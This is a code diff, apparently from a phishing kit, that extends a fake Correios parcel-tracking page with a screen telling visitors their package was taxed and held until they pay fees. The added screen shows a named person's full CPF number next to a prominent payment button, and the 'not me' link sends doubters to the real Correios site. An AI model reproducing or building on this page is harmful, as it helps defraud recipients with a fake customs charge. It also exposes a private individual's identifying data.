@@ -111,10 +111,10 @@
     }
 
     main {
-      max-width: 700px; /* Aumentei para interface de PC */
+      max-width: 700px;
       margin: 2rem auto;
       padding: 0 1rem;
-      text-align: center; /* Centraliza o texto dentro do main */
+      text-align: center;
       font-family: Arial, sans-serif;
       color: #003157;
     }
@@ -130,7 +130,7 @@
     /* Texto "ACOMPANHE SUAS ENCOMENDAS ABAIXO" restaurado */
     #tela-formulario h5 {
       text-align: center;
-      font-size: 1.2rem; /* Pode ajustar conforme o original */
+      font-size: 1.2rem;
       font-weight: 600;
       color: #003157;
       margin-bottom: 1.5rem;
@@ -221,26 +221,42 @@
       display: none;
     }
 
-    #resultado h2 {
+    /* Pagamento */
+    #pagamento {
+      background: #f0f0f0;
+      border-radius: 8px;
+      padding: 2rem;
+      font-family: Arial, sans-serif;
+      color: #003157;
+      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
+      text-align: center;
+      max-width: 700px;
+      margin: 2rem auto;
+      display: none;
+    }
+
+    #resultado h2, #pagamento h2 {
       font-weight: 700;
       margin-bottom: 1rem;
       color: #003157;
       font-size: 14px;
     }
 
-    #resultado p {
+    #resultado p, #pagamento p {
       font-size: 14px;
       margin: 0.5rem 0;
     }
 
-    #resultado p span {
+    #resultado p span, #pagamento p span {
       font-weight: 700;
       color: #007bff;
     }
 
     /* Rua e Bairro vazios */
     #res-rua,
-    #res-bairro {
+    #res-bairro,
+    #pag-rua,
+    #pag-bairro {
       color: transparent !important;
       user-select: none;
       pointer-events: none;
@@ -254,7 +270,7 @@
     }
 
     /* Botão sim sou eu */
-    #btn-sim-sou-eu {
+    #btn-sim-sou-eu, #btn-pagar {
       margin-top: 1.5rem;
       padding: 0.6rem 1.5rem;
       font-size: 1.1rem;
@@ -269,12 +285,12 @@
       width: 100%;
     }
 
-    #btn-sim-sou-eu:hover {
+    #btn-sim-sou-eu:hover, #btn-pagar:hover {
       background-color: #0056b3;
     }
 
     /* Container para alinhar botão e link */
-    #resultado .btn-container {
+    #resultado .btn-container, #pagamento .btn-container {
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -283,7 +299,7 @@
     }
 
     /* Link não sou eu abaixo do botão */
-    #nao-sou-eu {
+    #nao-sou-eu, #voltar-rastreio {
       color: gray;
       text-decoration: underline;
       cursor: pointer;
@@ -291,7 +307,7 @@
       display: inline-block;
     }
 
-    #nao-sou-eu:hover {
+    #nao-sou-eu:hover, #voltar-rastreio:hover {
       color: #505050;
     }
 
@@ -310,6 +326,34 @@
       to {
         transform: rotate(360deg);
       }
+    }
+    
+    /* Status box */
+    .status-box {
+      background-color: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+      text-align: left;
+    }
+    
+    .status-title {
+      font-weight: bold;
+      color: #d9534f;
+      margin-bottom: 10px;
+    }
+    
+    .status-item {
+      margin-bottom: 5px;
+      padding-left: 15px;
+      position: relative;
+    }
+    
+    .status-item:before {
+      content: "•";
+      position: absolute;
+      left: 0;
     }
   </style>
 </head>
@@ -386,6 +430,43 @@
       </div>
     </section>
 
+    <!-- Tela Pagamento -->
+    <section id="pagamento">
+      <h1>Portal Correios</h1>
+      <h2>Rastreamento</h2>
+      
+      <h2 style="color: #d9534f; font-size: 18px;">SUA ENCOMENDA FOI TRIBUTADA!</h2>
+      
+      <div class="status-box">
+        <div class="status-title">STATUS DA ENTREGA:</div>
+        <div class="status-item">AGUARDANDO SUA CONFIRMAÇÃO</div>
+      </div>
+      
+      <p>Sua encomenda está retida na agência dos Correios em São Paulo</p>
+      
+      <p>Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
+      
+      <p><span>NOME:</span> Rosiane O Silva</p>
+      <p><span>CPF:</span> 118.273.047-74</p>
+      <p><span>RUA:</span> <span id="pag-rua"></span></p>
+      <p><span>BAIRRO:</span> <span id="pag-bairro"></span></p>
+      <p><span>CIDADE:</span> Porciúncula</p>
+      
+      <div class="status-box">
+        <div class="status-title">Previsão de Entrega</div>
+        <div class="status-item">3 dias após o pagamento</div>
+        <div class="status-item">Objeto aguardando sua confirmação</div>
+        <div class="status-item">em Unidade de Fiscalização em São Paulo</div>
+      </div>
+      
+      <div class="btn-container">
+        <button id="btn-pagar">Efetuar Pagamento</button>
+        <div class="status-item">Objeto em transferência - por favor aguarde</div>
+        <div class="status-item">Objeto Postado</div>
+        <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
+      </div>
+    </section>
+
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
       <div>
         <img src="images/banner-1.jpg" alt="" class="w-100" />
@@ -394,41 +475,39 @@
   </main>
 
   <footer class="d-flex flex-wrap justify-content-center px-5 py-4 bg-yellow text-blue-dark" style="font-family: Arial, sans-serif; font-size: 14px; text-align: center;">
-  <div class="px-3 mb-3">
-    <h5 class="font-weight-700 mb-3">Fale Conosco</h5>
-    <ul style="list-style: none; padding-left: 0;">
-      <li class="mb-2">Registro de Manifestações</li>
-      <li class="mb-2">Central de Atendimento</li>
-      <li class="mb-2">Soluções para o seu negócio</li>
-      <li class="mb-2">Suporte ao cliente com contrato</li>
-      <li class="mb-2">Ouvidoria</li>
-    </ul>
-  </div>
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Fale Conosco</h5>
+      <ul style="list-style: none; padding-left: 0;">
+        <li class="mb-2">Registro de Manifestações</li>
+        <li class="mb-2">Central de Atendimento</li>
+        <li class="mb-2">Soluções para o seu negócio</li>
+        <li class="mb-2">Suporte ao cliente com contrato</li>
+        <li class="mb-2">Ouvidoria</li>
+      </ul>
+    </div>
 
-  <div class="px-3 mb-3">
-    <h5 class="font-weight-700 mb-3">Sobre Correios</h5>
-    <ul style="list-style: none; padding-left: 0;">
-      <li class="mb-2">Identidade corporativa</li>
-      <li class="mb-2">Educação e cultura</li>
-      <li class="mb-2">Código de ética</li>
-      <li class="mb-2">Transparência e prestação de contas</li>
-      <li class="mb-2">Política de Privacidade e Notas Legais</li>
-    </ul>
-  </div>
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Sobre Correios</h5>
+      <ul style="list-style: none; padding-left: 0;">
+        <li class="mb-2">Identidade corporativa</li>
+        <li class="mb-2">Educação e cultura</li>
+        <li class="mb-2">Código de ética</li>
+        <li class="mb-2">Transparência e prestação de contas</li>
+        <li class="mb-2">Política de Privacidade e Notas Legais</li>
+      </ul>
+    </div>
 
-  <div class="px-3 mb-3">
-    <h5 class="font-weight-700 mb-3">Outros Sites</h5>
-    <ul style="list-style: none; padding-left: 0;">
-      <li class="mb-2">Loja online dos Correios</li>
-    </ul>
-  </div>
+    <div class="px-3 mb-3">
+      <h5 class="font-weight-700 mb-3">Outros Sites</h5>
+      <ul style="list-style: none; padding-left: 0;">
+        <li class="mb-2">Loja online dos Correios</li>
+      </ul>
+    </div>
 
-  <div class="w-100 text-center mt-3">
-    <p>©️ Copyright 2025 Correios</p>
-  </div>
-</footer>
-
-
+    <div class="w-100 text-center mt-3">
+      <p>©️ Copyright 2025 Correios</p>
+    </div>
+  </footer>
 
   <script>
     function formatarCPF(cpf) {
@@ -534,11 +613,30 @@
         intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
       });
 
+    // Script para o botão "SIM SOU EU"
+    document.getElementById("btn-sim-sou-eu").addEventListener("click", function() {
+      document.getElementById("resultado").style.display = "none";
+      document.getElementById("pagamento").style.display = "block";
+    });
+
     // Script para o link "não sou eu"
     document.getElementById("nao-sou-eu").addEventListener("click", function (e) {
       e.preventDefault();
       window.open("https://www.correios.com.br/", "_blank");
       window.close();
+    });
+    
+    // Script para o link "voltar ao rastreamento"
+    document.getElementById("voltar-rastreio").addEventListener("click", function(e) {
+      e.preventDefault();
+      document.getElementById("pagamento").style.display = "none";
+      document.getElementById("resultado").style.display = "block";
+    });
+    
+    // Script para o botão "Efetuar Pagamento"
+    document.getElementById("btn-pagar").addEventListener("click", function() {
+      alert("Redirecionando para página de pagamento...");
+      // Aqui você pode adicionar o redirecionamento real para a página de pagamento
     });
   </script>
 </body>
